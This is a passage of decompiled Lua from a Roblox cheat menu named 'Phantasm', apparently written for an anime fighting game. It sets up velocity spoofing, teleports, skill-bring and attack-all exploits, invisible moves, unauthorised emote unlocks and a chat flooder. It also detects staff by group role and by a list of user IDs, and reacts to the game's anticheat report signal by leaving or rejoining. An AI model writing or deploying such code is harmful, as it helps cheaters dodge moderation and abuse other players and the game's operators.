                                    tmp606.CameraSubject = tmp609
                                end
                                if tmp590 then
                                    heartbeatTp(tmp590)
                                end
                            end
                        end
                    else
                        return
                    end
                end
            })
            KeybindsBox:AddSlider("OrbitSpeed", {
                Text = bypassText("Orbit Speed"),
                Default = 10,
                Min = 1,
                Max = 100,
                Rounding = 1
            })
            KeybindsBox:AddSlider("OrbitDistance", {
                Text = bypassText("Orbit Distance"),
                Default = 3,
                Min = 1,
                Max = 100,
                Rounding = 1
            })
            KeybindsBox:AddDivider()
            KeybindsBox:AddToggle("VelocitySpoof", {
                Text = bypassText("Velocity Spoof"),
                Default = false,
                Callback = function(arg613)
                    if not arg613 then
                        FeatureFlags["Velocity Spoof"] = false
                        if Options.VelocitySpoofBind:GetState() == true then
                            Options.VelocitySpoofBind.Toggled = false
                            Options.VelocitySpoofBind:DoClick()
                        end
                    end
                end
            }):AddKeyPicker("VelocitySpoofBind", {
                SyncToggleState = false,
                Mode = "Toggle",
                Default = "X",
                Text = bypassText("Velocity Spoof"),
                Callback = function(arg614)
                    if up525["Velocity Spoof"] then
                        return
                    elseif arg614 and not Toggles.VelocitySpoof.Value then
                        RenderStepped:Wait()
                        up525["Velocity Spoof"] = true
                        Options.VelocitySpoofBind.Toggled = false
                        Options.VelocitySpoofBind:DoClick()
                        up525["Velocity Spoof"] = false
                    elseif Toggles.VelocitySpoof.Value then
                        FeatureFlags["Velocity Spoof"] = arg614
                        UILib:Notify({
                            Title = bypassText("Velocity Spoof"),
                            Description = bypassText("Toggled ") .. (arg614 and "on \226\156\133" or "off \226\157\140"),
                            Time = 2,
                            SoundId = SoundIds.Notification
                        })
                    end
                end
            })
            KeybindsBox:AddSlider("VelocityX", {
                Text = bypassText("X"),
                Default = 0,
                Min = 0,
                Max = 16384,
                Rounding = 1,
                Compact = true,
                Callback = function(arg615)
                    FeatureFlags["Velocity Spoof Settings"] = Vector3.new(arg615, FeatureFlags["Velocity Spoof Settings"].Y, FeatureFlags["Velocity Spoof Settings"].Z)
                end
            })
            KeybindsBox:AddSlider("VelocityY", {
                Text = bypassText("Y"),
                Default = 0,
                Min = 0,
                Max = 16384,
                Rounding = 1,
                Compact = true,
                Callback = function(arg616)
                    FeatureFlags["Velocity Spoof Settings"] = Vector3.new(FeatureFlags["Velocity Spoof Settings"].X, arg616, FeatureFlags["Velocity Spoof Settings"].Z)
                end
            })
            KeybindsBox:AddSlider("VelocityZ", {
                Text = bypassText("Z"),
                Default = 0,
                Min = 0,
                Max = 16384,
                Rounding = 1,
                Compact = true,
                Callback = function(arg617)
                    FeatureFlags["Velocity Spoof Settings"] = Vector3.new(FeatureFlags["Velocity Spoof Settings"].X, FeatureFlags["Velocity Spoof Settings"].Y, arg617)
                end
            })
            KeybindsBox:AddDivider()
            KeybindsBox:AddToggle("TP1", {
                Text = bypassText("Teleport 1"),
                Default = false,
                Callback = function(arg618)
                    if not arg618 and Options.TP1Bind:GetState() == true then
                        Options.TP1Bind.Toggled = false
                        Options.TP1Bind:DoClick()
                    end
                end
            }):AddKeyPicker("TP1Bind", {
                SyncToggleState = false,
                Mode = "Toggle",
                Default = "E",
                Text = bypassText("Teleport 1"),
                Callback = function(_)
                    Options.TP1Bind.Toggled = false
                    if Toggles.TP1.Value then
                        local tmp619 = getChar(LocalPlayer)
                        local tmp620
                        if tmp619 then
                            tmp620 = getRoot(tmp619)
                        else
                            tmp620 = tmp619
                        end
                        local tmp621
                        if tmp619 then
                            tmp621 = getHumanoid(tmp619)
                        else
                            tmp621 = tmp619
                        end
                        if tmp619 and (tmp620 and (tmp621 and tmp621.Health > 0)) then
                            heartbeatTp(tmp620.CFrame * CFrame.new(Options.TP1X.Value, Options.TP1Y.Value, Options.TP1Z.Value))
                        end
                    end
                end
            })
            KeybindsBox:AddSlider("TP1X", {
                Text = bypassText("X"),
                Default = 0,
                Min = - 25,
                Max = 25,
                Rounding = 1,
                Compact = true
            })
            KeybindsBox:AddSlider("TP1Y", {
                Text = bypassText("Y"),
                Default = 0,
                Min = - 25,
                Max = 25,
                Rounding = 1,
                Compact = true
            })
            KeybindsBox:AddSlider("TP1Z", {
                Text = bypassText("Z"),
                Default = 20,
                Min = - 25,
                Max = 25,
                Rounding = 1,
                Compact = true
            })
            KeybindsBox:AddDivider()
            KeybindsBox:AddToggle("TP2", {
                Text = bypassText("Teleport 2"),
                Default = false,
                Callback = function(arg622)
                    if not arg622 and Options.TP2Bind:GetState() == true then
                        Options.TP2Bind.Toggled = false
                        Options.TP2Bind:DoClick()
                    end
                end
            }):AddKeyPicker("TP2Bind", {
                SyncToggleState = false,
                Mode = "Toggle",
                Default = "R",
                Text = bypassText("Teleport 2"),
                Callback = function(_)
                    Options.TP2Bind.Toggled = false
                    if Toggles.TP2.Value then
                        local tmp623 = getChar(LocalPlayer)
                        local tmp624
                        if tmp623 then
                            tmp624 = getRoot(tmp623)
                        else
                            tmp624 = tmp623
                        end
                        local tmp625
                        if tmp623 then
                            tmp625 = getHumanoid(tmp623)
                        else
                            tmp625 = tmp623
                        end
                        if tmp623 and (tmp624 and (tmp625 and tmp625.Health > 0)) then
                            heartbeatTp(tmp624.CFrame * CFrame.new(Options.TP2X.Value, Options.TP2Y.Value, Options.TP2Z.Value))
                        end
                    end
                end
            })
            KeybindsBox:AddSlider("TP2X", {
                Text = bypassText("X"),
                Default = 0,
                Min = - 25,
                Max = 25,
                Rounding = 1,
                Compact = true
            })
            KeybindsBox:AddSlider("TP2Y", {
                Text = bypassText("Y"),
                Default = 0,
                Min = - 25,
                Max = 25,
                Rounding = 1,
                Compact = true
            })
            KeybindsBox:AddSlider("TP2Z", {
                Text = bypassText("Z"),
                Default = - 20,
                Min = - 25,
                Max = 25,
                Rounding = 1,
                Compact = true
            })
            local up626 = {
                422755031,
                198131804,
                681405668,
                3414432341,
                339633571,
                430966809,
                2039323684,
                117723419,
                1015595932,
                263944298,
                112905203,
                2284964418,
                1266437961,
                3120648134,
                1148139861,
                1633233654,
                3350014406,
                971193650,
                661273560,
                66105529,
                77342385,
                167343092,
                2055306963,
                141984224,
                438917845,
                1391134999,
                1796550069,
                255671730,
                3162123826,
                1059541187,
                1259898795,
                31070091,
                1041867508,
                994994173,
                1446694201,
                77525605,
                1001242712,
                2533866869,
                4983064295
            }
            local function up637(arg627)
                if arg627 ~= LocalPlayer then
                    local tmp628 = arg627.DisplayName
                    if arg627:IsInGroup(12013007) and Toggles.SDCheckGroup.Value then
                        local tmp629 = arg627:GetRoleInGroup(12013007)
                        if tmp629 == "Tester \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189" then
                            UILib:Notify({
                                Title = bypassText("A tester is in your game!"),
                                Description = bypassText(tmp628),
                                Time = 10,
                                SoundId = SoundIds.Notification
                            })
                        elseif tmp629 == "Moderator\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\184\143" then
                            UILib:Notify({
                                Title = bypassText("A moderator is in your game!"),
                                Description = bypassText(tmp628),
                                Time = 10,
                                SoundId = SoundIds.Notification
                            })
                        elseif tmp629 == "Contributor \226\156\143\239\184\143" then
                            UILib:Notify({
                                Title = bypassText("A contributor is in your game!"),
                                Description = bypassText(tmp628),
                                Time = 10,
                                SoundId = SoundIds.Notification
                            })
                        elseif tmp629 == "Developer \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\141\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189" then
                            UILib:Notify({
                                Title = bypassText("A developer is in your game!"),
                                Description = bypassText(tmp628),
                                Time = 10,
                                SoundId = SoundIds.Notification
                            })
                        elseif tmp629 == "Owner \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189" then
                            UILib:Notify({
                                Title = bypassText("The owner is in your game!"),
                                Description = bypassText(tmp628),
                                Time = 10,
                                SoundId = SoundIds.Notification
                            })
                        end
                    end
                    local tmp630, tmp631, tmp632 = pairs(up626)
                    local tmp633 = {}
                    while true do
                        local tmp634
                        tmp632, tmp634 = tmp630(tmp631, tmp632)
                        if tmp632 == nil then
                            break
                        end
                        if arg627.UserId == tmp634 and Toggles.StaffDetector.Value then
                            return UILib:Notify({
                                Title = bypassText("A special person has joined!"),
                                Description = bypassText(tmp628),
                                Time = 10,
                                SoundId = SoundIds.Notification
                            })
                        end
                        if Toggles.SDCheckFriends.Value and arg627:IsFriendsWith(tmp634) then
                            local tmp635 = Players
                            tmp633[# tmp633 + 1] = tmp635:GetNameFromUserIdAsync(tmp634)
                        end
                    end
                    if # tmp633 > 0 then
                        local tmp636 = # tmp633 == 1 and tmp633[1] or (# tmp633 == 2 and table.concat(tmp633, " and ") or # tmp633 .. " special people")
                        UILib:Notify(bypassText(tmp628, "has joined and is friends with", tmp636), 10, SoundIds.Notification)
                    end
                end
            end
            AntiBanBox:AddToggle("StaffDetector", {
                Text = bypassText("Staff Detector"),
                Default = false,
                Callback = function(arg638)
                    if arg638 then
                        local tmp639 = Players
                        local tmp640, tmp641, tmp642 = pairs(tmp639:GetPlayers())
                        while true do
                            local tmp643
                            tmp642, tmp643 = tmp640(tmp641, tmp642)
                            if tmp642 == nil then
                                break
                            end
                            task.spawn(pcall, up637, tmp643)
                        end
                    elseif not arg638 then
                        Toggles.SDCheckGroup:SetValue(false)
                        Toggles.SDCheckFriends:SetValue(false)
                    end
                end
            })
            AntiBanBox:AddToggle("SDCheckGroup", {
                Text = bypassText("Check Group"),
                Default = false
            })
            AntiBanBox:AddToggle("SDCheckFriends", {
                Text = bypassText("Check Friends"),
                Default = false
            })
            local up644 = 0
            local up645 = 0
            AntiBanBox:AddLabel({
                Text = bypassText("Anticheat Flags:\n\r\nA1: Report\r\nA2: Animation\r\nA3: Remote Event"),
                DoesWrap = true,
                Size = 16
            })
            AntiBanBox:AddToggle("AnticheatDetector", {
                Text = bypassText("Anticheat Detector"),
                Tooltip = bypassText("Detects when the game checks for cheats."),
                Default = false,
                Callback = function(arg646)
                    if arg646 then
                        local tmp650 = ReplicatedStorage.Replication.OnClientEvent:Connect(function(...)
                            local tmp647 = select(1, ...)
                            if tmp647 then
                                local tmp648 = rawget(tmp647, "Effect") or "Unknown"
                                local tmp649 = Options.AvoidBanMethod.Value
                                if tmp648:lower() == "hicheck" then
                                    up644 = up644 + 1
                                    UILib:Notify({
                                        Title = bypassText("Anticheat Flagged"),
                                        Description = bypassText("A1 (Report)"),
                                        Time = 10,
                                        SoundId = SoundIds.Notification
                                    })
                                    if tmp649 == "Auto Leave" then
                                        LocalPlayer:Kick("\n[Phantasm]\nAnticheat Triggered, You were reported for exploiting.")
                                    elseif tmp649 == "Auto Rejoin" then
                                        rejoin({
                                            Message = "\n[Phantasm]\nAnticheat Triggered, You were reported for exploiting.",
                                            Delay = Options.RejoinDelay.Value
                                        })
                                    end
                                end
                            end
                        end)
                        repeat
                            task.wait()
                        until not Toggles.AnticheatDetector.Value
                        tmp650:Disconnect()
                    end
                end
            })
            AntiBanBox:AddDropdown("AvoidBanMethod", {
                Values = {
                    "None",
                    "Auto Leave",
                    "Auto Rejoin"
                },
                Default = 1,
                Multi = false,
                Text = bypassText("Avoid Ban Method")
            })
            AntiBanBox:AddSlider("RejoinDelay", {
                Text = bypassText("Rejoin Delay"),
                Default = 3,
                Min = 0,
                Max = 10,
                Rounding = 1
            })
            ExtraBox:AddToggle("AutoEmoteSpin", {
                Text = bypassText("Auto Emote Spin"),
                Default = false
            })
            ExtraBox:AddDivider()
            ExtraBox:AddToggle("FreeEmotes", {
                Text = bypassText("Knockoff Free Emotes"),
                Default = false
            })
            ExtraBox:AddToggle("FreeEmoteSearchBar", {
                Text = bypassText("Free Emote Search Bar"),
                Default = false,
                Callback = function(arg651)
                    if not (arg651 and LocalPlayer:GetAttribute("EmoteSearchBar")) then
                        LocalPlayer:SetAttribute("EmoteSearchBar", arg651 and true or nil)
                    end
                end
            })
            ExtraBox:AddToggle("Free8EmoteSlots", {
                Text = bypassText("Free 8 Emote Slots"),
                Default = false,
                Callback = function(arg652)
                    if not (arg652 and LocalPlayer:GetAttribute("ExtraSlots")) then
                        LocalPlayer:SetAttribute("ExtraSlots", arg652 and true or nil)
                    end
                end
            })
            ExtraBox:AddToggle("FreeEmotePage", {
                Text = bypassText("Free Emote Page"),
                Default = false,
                Callback = function(arg653)
                    if not (arg653 and LocalPlayer:GetAttribute("EmotePages")) then
                        LocalPlayer:SetAttribute("EmotePages", arg653 and true or nil)
                    end
                end
            })
            ExtraBox:AddLabel({
                Text = bypassText("Total Emotes:", Emotes and # Emotes or "Unknown"),
                DoesWrap = true,
                Size = 16
            })
            ExtraBox:AddToggle("DisableMessaging", {
                Text = bypassText("Disable Messaging"),
                Tooltip = bypassText("Incase you get mad at someone and can\'t hold yourself back."),
                Default = false
            })
            ExtraBox:AddToggle("AntiChatLogger", {
                Text = bypassText("Anti Chat Logger"),
                Default = false
            })
            ExtraBox:AddToggle("ChatFlooder", {
                Text = bypassText("Chat Flooder"),
                Default = false,
                Callback = function(arg654)
                    if arg654 then
                        while true do
                            sendMsg(randomAlphabeticalString(200))
                            local tmp655 = tick()
                            repeat
                                task.wait()
                            until tick() >= tmp655 + Options.ChatFlooderDelay.Value or not Toggles.ChatFlooder.Value
                            if not Toggles.ChatFlooder.Value then
                            end
                        end
                    else
                        return
                    end
                end
            })
            ExtraBox:AddSlider("ChatFlooderDelay", {
                Text = bypassText("Chat Flooder Delay"),
                Default = 3.5,
                Min = 0.5,
                Max = 5,
                Rounding = 1
            })
            if up446 == "8503ecc70e68aa38ab0cf58354594365abbb8c0943429dd68d1243902600533e5d4149e25dd640afb87da3f52a4f6751d7f8133cd25275792e9b40d06bf43156" then
                ExploitsMainBox:AddToggle("TrashcanLaunchh", {
                    Text = bypassText("Frozen Soul Dual Moveset"),
                    Default = false
                })
            end
            ExploitsMainBox:AddDivider()
            ExploitsMainBox:AddToggle("TrashcanLaunch", {
                Text = bypassText("Trashcan Launch"),
                Default = false
            })
            ExploitsMainBox:AddSlider("Trashcan_LaunchPower", {
                Text = bypassText("Launch Power"),
                Default = 100,
                Min = 1,
                Max = 2500,
                Rounding = 1
            })
            ExploitsMainBox:AddDivider()
            ExploitsMainBox:AddToggle("SkillBring", {
                Text = bypassText("Skill Bring"),
                Default = false
            })
            ExploitsMainBox:AddToggle("SkillBringTPBack", {
                Text = bypassText("TP Back on Bring"),
                Default = false
            })
            ExploitsMainBox:AddDropdown("SkillBringArea", {
                Text = bypassText("Skill Bring Area"),
                Values = sortedTPNames,
                Multi = false,
                Default = table.find(sortedTPNames, "Death Counter"),
                Searchable = false
            })
            local up656 = TeleportLocations.Middle
            ExploitsMainBox:AddButton({
                Text = bypassText("Goto"),
                Callback = function()
                    local tmp657 = TeleportLocations[Options.SkillBringArea.Value]
                    local tmp658 = getChar(LocalPlayer)
                    local tmp659
                    if tmp658 then
                        tmp659 = getRoot(tmp658)
                    else
                        tmp659 = tmp658
                    end
                    if tmp658 and (tmp659 and (up656.Position - tmp657.Position).Magnitude >= 100) then
                        up656 = tmp659.CFrame
                    end
                    heartbeatTp(tmp657)
                end
            }):AddButton({
                Text = bypassText("Back"),
                Callback = function()
                    heartbeatTp(up656)
                end
            })
            ExploitsMainBox:AddDivider()
            ExploitsMainBox:AddToggle("AttackAll", {
                Text = bypassText("Attack All"),
                Default = false
            })
            ExploitsMainBox:AddDropdown("AttackAllMoves", {
                Values = {
                    "Savage Tornado",
                    "Brutal Beatdown",
                    "Crushed Rock Variant"
                },
                Multi = true,
                Default = {}
            })
            ExploitsMainBox:AddDivider()
            ExploitsMainBox:AddToggle("SkillThrow", {
                Text = bypassText("Skill Throw"),
                Default = false
            })
            ExploitsMainBox:AddDropdown("SkillThrowMoves", {
                Values = {
                    "Hunters Grasp",
                    "Homerun"
                },
                Multi = true,
                Default = {}
            })
            ExploitsMainBox:AddDivider()
            ExploitsMainBox:AddToggle("NoBP_WindstormFury", {
                Text = bypassText("No Windstorm Fury BP"),
                Default = false
            })
            ExploitsMainBox:AddToggle("NoBP_TatsumakiUlt", {
                Text = bypassText("No Tatsumaki Ult BP"),
                Default = false
            })
            ExploitsMainBox:AddToggle("NoBP_PreysPeril", {
                Text = bypassText("No Prey\'s Peril BP"),
                Default = false
            })
            ExploitsMainBox:AddToggle("FlingOnDeath", {
                Text = bypassText("Fling On Death"),
                Default = false
            })
            WallComboBox:AddToggle("WallComboAnywhere", {
                Text = bypassText("Wall Combo Anywhere"),
                Default = false
            })
            WallComboBox:AddDropdown("AutoWallCombo", {
                Text = bypassText("Auto Wall Combo"),
                Values = {
                    "Disabled",
                    "Auto Wall Combo",
                    "Auto Wall Combo + Bring"
                },
                Multi = false,
                Default = 1
            })
            WallComboBox:AddToggle("AutoWallComboTPBack", {
                Text = bypassText("Teleport Back"),
                Default = false
            })
            WallComboBox:AddDropdown("AutoWallComboArea", {
                Text = bypassText("Area"),
                Values = sortedCamNames,
                Multi = false,
                Default = table.find(sortedCamNames, "Death Counter"),
                Searchable = true
            })
            local up660 = TeleportLocations.Middle
            WallComboBox:AddButton({
                Text = bypassText("Teleport To Area"),
                Callback = function()
                    local tmp661 = CameraLocations[Options.AutoWallComboArea.Value]
                    local tmp662 = getChar(LocalPlayer)
                    local tmp663
                    if tmp662 then
                        tmp663 = getRoot(tmp662)
                    else
                        tmp663 = tmp662
                    end
                    if tmp662 and (tmp663 and (up660.Position - tmp661.Position).Magnitude >= 100) then
                        up660 = tmp663.CFrame
                    end
                    heartbeatTp(tmp661)
                end
            })
            WallComboBox:AddButton({
                Text = bypassText("Teleport Back"),
                Callback = function()
                    heartbeatTp(up660)
                end
            })
            AntisBox:AddButton({
                Text = bypassText("Toggle All On"),
                Callback = function()
                    local tmp664, tmp665, tmp666 = pairs(Toggles)
                    while true do
                        local tmp667
                        tmp666, tmp667 = tmp664(tmp665, tmp666)
                        if tmp666 == nil then
                            break
                        end
                        if tmp666:find("^AntiMoves_") and tmp667.Type == "Toggle" then
                            tmp667:SetValue(true)
                        end
                    end
                    local tmp668, tmp669, tmp670 = pairs(Options)
                    while true do
                        local tmp671
                        tmp670, tmp671 = tmp668(tmp669, tmp670)
                        if tmp670 == nil then
                            break
                        end
                        if tmp670:find("^AntiMoves_") and tmp671.Type == "Dropdown" then
                            local tmp672, tmp673, tmp674 = pairs(tmp671.Values)
                            local tmp675 = {}
                            while true do
                                local tmp676
                                tmp674, tmp676 = tmp672(tmp673, tmp674)
                                if tmp674 == nil then
                                    break
                                end
                                tmp675[tmp676] = true
                            end
                            tmp671:SetValue(tmp675)
                        end
                    end
                end
            }):AddButton({
                Text = bypassText("Toggle All Off"),
                Callback = function()
                    local tmp677, tmp678, tmp679 = pairs(Toggles)
                    while true do
                        local tmp680
                        tmp679, tmp680 = tmp677(tmp678, tmp679)
                        if tmp679 == nil then
                            break
                        end
                        if tmp679:find("^AntiMoves_") and tmp680.Type == "Toggle" then
                            tmp680:SetValue(false)
                        end
                    end
                    local tmp681, tmp682, tmp683 = pairs(Options)
                    while true do
                        local tmp684
                        tmp683, tmp684 = tmp681(tmp682, tmp683)
                        if tmp683 == nil then
                            break
                        end
                        if tmp683:find("^AntiMoves_") and tmp684.Type == "Dropdown" then
                            tmp684:SetValue({})
                        end
                    end
                end
            })
            AntisBox:AddToggle("AntiExploits_Fling", {
                Text = bypassText("Anti Fling"),
                Default = false
            })
            AntisBox:AddToggle("AntiExploits_Invisibility", {
                Text = bypassText("Anti Invisibility"),
                Default = false,
                Visible = true,
                Callback = function(arg685)
                    if arg685 then
                        local function up691(argUp686)
                            local tmp687, tmp688, tmp689 = pairs(MusicIds)
                            while true do
                                local tmp690
                                tmp689, tmp690 = tmp687(tmp688, tmp689)
                                if tmp689 == nil then
                                    break
                                end
                                if argUp686.Animation.AnimationId:match(tmp690) and argUp686.Speed ~= 1 then
                                    task.spawn(function()
                                        repeat
                                            argUp686:AdjustWeight(- 999999)
                                            RenderStepped:Wait()
                                        until not (argUp686.IsPlaying and Toggles.AntiExploits_Invisibility.Value)
                                    end)
                                end
                            end
                        end
                        local function tmp706(arg692)
                            local tmp693 = getChar(arg692)
                            local tmp694
                            if tmp693 then
                                tmp694 = getRoot(tmp693)
                            else
                                tmp694 = tmp693
                            end
                            local tmp695
                            if tmp693 then
                                tmp695 = getHumanoid(tmp693)
                            else
                                tmp695 = tmp693
                            end
                            if tmp693 and tmp695 then
                                local tmp696, tmp697, tmp698 = pairs(tmp693:GetDescendants())
                                while true do
                                    local up699
                                    tmp698, up699 = tmp696(tmp697, tmp698)
                                    if tmp698 == nil then
                                        break
                                    end
                                    if up699:IsA("BasePart") then
                                        if up699.Transparency == 1 and up699 ~= tmp694 and not up699.Name:find("^Hitbox_") then
                                            up699.Transparency = 0
                                        end
                                        local up700 = 0
                                        up699:GetPropertyChangedSignal("Transparency"):Connect(function()
                                            if up699.Transparency == 1 then
                                                up699.Transparency = up700
                                            end
                                            up700 = up699.Transparency
                                        end)
                                    end
                                end
                                local tmp701, tmp702, tmp703 = pairs(tmp695:GetPlayingAnimationTracks())
                                while true do
                                    local tmp704
                                    tmp703, tmp704 = tmp701(tmp702, tmp703)
                                    if tmp703 == nil then
                                        break
                                    end
                                    up691(tmp704)
                                end
                                tmp695.AnimationPlayed:Connect(function(arg705)
                                    up691(arg705)
                                end)
                            end
                        end
                        local tmp707 = Players
                        local tmp708, tmp709, tmp710 = pairs(tmp707:GetPlayers())
                        while true do
                            local tmp711
                            tmp710, tmp711 = tmp708(tmp709, tmp710)
                            if tmp710 == nil then
                                break
                            end
                            if tmp711 ~= LocalPlayer then
                                tmp706(tmp711)
                            end
                        end
                        local tmp712 = Players.PlayerAdded:Connect(tmp706)
                        repeat
                            RenderStepped:Wait()
                        until not Toggles.AntiExploits_Invisibility.Value
                        tmp712:Disconnect()
                    end
                end
            })
            AntisBox:AddToggle("AntiMovesMisc_BackdashCancel", {
                Text = bypassText("Backdash Cancel"),
                Default = false
            })
            AntisBox:AddToggle("AntiMoves_Trashcan", {
                Text = bypassText("Anti Trash Can"),
                Default = false
            })
            AntisBox:AddDropdown("AntiMoves_Saitama", {
                Text = bypassText("Anti Saitama"),
                Values = {
                    "Anti Normal Punch",
                    "Anti Consecutive Punches",
                    "Anti Shove",
                    "Anti Uppercut",
                    "Anti Death Counter",
                    "Anti Death Counter Quotes",
                    "Anti Table Flip",
                    "Anti Serious Punch",
                    "Anti Omni-Directional Punch"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            AntisBox:AddDropdown("AntiMoves_Garou", {
                Text = bypassText("Anti Garou"),
                Values = {
                    "Anti Flowing Water",
                    "Anti Lethal Whirlwind Stream",
                    "Anti Hunters Grasp",
                    "Anti Preys Peril",
                    "Anti Garou Ult",
                    "Anti Water Stream Rock Smashing Fist",
                    "Anti Final Hunt",
                    "Anti Rock Splitting Fist",
                    "Anti Crushed Rock"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            AntisBox:AddDropdown("AntiMoves_Genos", {
                Text = bypassText("Anti Genos"),
                Values = {
                    "Anti Thunder Kick",
                    "Anti Flamewave Cannon",
                    "Anti Incinerate"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            AntisBox:AddDropdown("AntiMoves_Tatsumaki", {
                Text = bypassText("Anti Tatsumaki"),
                Values = {
                    "Anti Crushing Pull",
                    "Anti Windstorm Fury",
                    "Anti Stone Grave",
                    "Anti Expulsive Push",
                    "Anti Tatsumaki Ult",
                    "Anti Terrible Tornado"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            AntisBox:AddDropdown("AntiMoves_AtomicSamurai", {
                Text = bypassText("Anti Atomic Samurai"),
                Values = {
                    "Anti Atomic Samurai Ult",
                    "Anti Sunset",
                    "Anti Solar Cleave",
                    "Anti Atomic Slash",
                    "Anti Atomic Slash Finisher"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            AntisBox:AddDropdown("AntiMoves_Suiryu", {
                Text = bypassText("Anti Suiryu"),
                Values = {
                    "Anti Whirlwind Drop",
                    "Anti Suiryu Ult",
                    "Anti Grand Fissure",
                    "Anti Twin Fangs",
                    "Anti Earth Splitting Strike",
                    "Anti Last Breath"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            AntisBox:AddDropdown("AntiMoves_MetalBat", {
                Text = formatRichText(255, 0, 0, "Anti Metal Bat"),
                Values = {
                    "Anti Savage Tornado",
                    "Anti Death Blow"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            AntisBox:AddDropdown("AntiMoves_Sonic", {
                Text = formatRichText(255, 0, 0, bypassText("Anti Speed-o\'-Sonic")),
                Values = {
                    "Anti Flash Strike",
                    "Anti Whirlwind Kick",
                    "Anti Twinblade Rush",
                    "Anti Carnage",
                    "Anti Fourfold Flashstrike"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            AntisBox:AddDropdown("AntiMoves_KJ", {
                Text = formatRichText(255, 0, 0, bypassText("Anti KJ")),
                Values = {
                    "Anti Stoic Bomb",
                    "Anti 20-20-20 Dropkick",
                    "Anti Five Seasons"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            AntisBox:AddDropdown("AntiMoves_FrozenSoul", {
                Text = formatRichText(0, 255, 255, bypassText("Anti Frozen Soul")),
                Values = {
                    "Anti Permafrost",
                    "Anti Frost Forge",
                    "Anti Freezing Path",
                    "Anti Judgement Chain"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            InvisibleMovesBox:AddButton({
                Text = bypassText("Toggle All On"),
                Callback = function()
                    local tmp713, tmp714, tmp715 = pairs(Toggles)
                    while true do
                        local tmp716
                        tmp715, tmp716 = tmp713(tmp714, tmp715)
                        if tmp715 == nil then
                            break
                        end
                        if tmp715:find("^InvisibleMoves_") and tmp716.Type == "Toggle" then
                            tmp716:SetValue(true)
                        end
                    end
                    local tmp717, tmp718, tmp719 = pairs(Options)
                    while true do
                        local tmp720
                        tmp719, tmp720 = tmp717(tmp718, tmp719)
                        if tmp719 == nil then
                            break
                        end
                        if tmp719:find("^InvisibleMoves_") and tmp720.Type == "Dropdown" then
                            local tmp721, tmp722, tmp723 = pairs(tmp720.Values)
                            local tmp724 = {}
                            while true do
                                local tmp725
                                tmp723, tmp725 = tmp721(tmp722, tmp723)
                                if tmp723 == nil then
                                    break
                                end
                                tmp724[tmp725] = true
                            end
                            tmp720:SetValue(tmp724)
                        end
                    end
                end
            }):AddButton({
                Text = bypassText("Toggle All Off"),
                Callback = function()
                    local tmp726, tmp727, tmp728 = pairs(Toggles)
                    while true do
                        local tmp729
                        tmp728, tmp729 = tmp726(tmp727, tmp728)
                        if tmp728 == nil then
                            break
                        end
                        if tmp728:find("^InvisibleMoves_") and tmp729.Type == "Toggle" then
                            tmp729:SetValue(false)
                        end
                    end
                    local tmp730, tmp731, tmp732 = pairs(Options)
                    while true do
                        local tmp733
                        tmp732, tmp733 = tmp730(tmp731, tmp732)
                        if tmp732 == nil then
                            break
                        end
                        if tmp732:find("^InvisibleMoves_") and tmp733.Type == "Dropdown" then
                            tmp733:SetValue({})
                        end
                    end
                end
            })
            InvisibleMovesBox:AddToggle("InvisibleMoves_Block", {
                Text = bypassText("Invisible Block"),
                Default = false
            })
            InvisibleMovesBox:AddToggle("InvisibleMoves_BlockColor", {
                Text = bypassText("Block Color"),
                Default = false
            }):AddColorPicker("InvisibleMoves_BlockColor1", {
                Default = Color3.fromRGB(0, 255, 255),
                Title = "Start"
            }):AddColorPicker("InvisibleMoves_BlockColor2", {
                Default = Color3.fromRGB(0, 0, 255),
                Title = "Middle",
                Transparency = 0
            }):AddColorPicker("InvisibleMoves_BlockColor3", {
                Default = Color3.fromRGB(255, 0, 0),
                Title = "End",
                Transparency = 0
            })
            InvisibleMovesBox:AddToggle("InvisibleMoves_Counter", {
                Text = bypassText("Invisible Counter"),
                Default = false
            })
            InvisibleMovesBox:AddToggle("InvisibleMoves_CounterHit", {
                Text = bypassText("Invisible Counter Hit"),
                Default = false
            })
            InvisibleMovesBox:AddDropdown("InvisibleMoves_Saitama", {
                Text = bypassText("Invisible Saitama"),
                Values = {
                    "Invisible Ult",
                    "Invisible Table Flip",
                    "Invisible Serious Punch",
                    "Invisible Omni-Directional Punch"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            InvisibleMovesBox:AddDropdown("InvisibleMoves_Garou", {
                Text = bypassText("Invisible Garou"),
                Values = {
                    "Invisible Ult"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            InvisibleMovesBox:AddDropdown("InvisibleMoves_Sonic", {
                Text = bypassText("Invisible Speed-o\'-Sonic"),
                Values = {
                    "Invisible Ult"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            InvisibleMovesBox:AddDropdown("InvisibleMoves_Genos", {
                Text = bypassText("Invisible Genos"),
                Values = {
                    "Invisible Ult",
                    "Invisible Incinerate"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            InvisibleMovesBox:AddDropdown("InvisibleMoves_Tatsumaki", {
                Text = bypassText("Invisible Tatsumaki"),
                Values = {
                    "Invisible Crushing Pull",
                    "Invisible Windstorm Fury",
                    "Invisible Stone Grave",
                    "Invisible Expulsive Push",
                    "Invisible Ult",
                    "Invisible Terrible Tornado",
                    "Invisible Terrible Tornado Finisher"
                },
                Multi = true,
                Default = {},
                Searchable = true
            })
            InvisibleMovesBox:AddDropdown("InvisibleMoves_AtomicSamurai", {
                Text = bypassText("Invisible Atomic Samurai"),
                Values = {
                    "Invisible Atmos Cleave",
                    "Invisible Ult",
                    "Invisible Sunset",
                    "Invisible Solar Cleave",
                    "Invisible Sunrise",
                    "Invisible Sunrise Finisher",
                    "Invisible Atomic Slash",
                    "Invisible Atomic Slash Finisher"
                },
                Multi = true,
                Default = {},
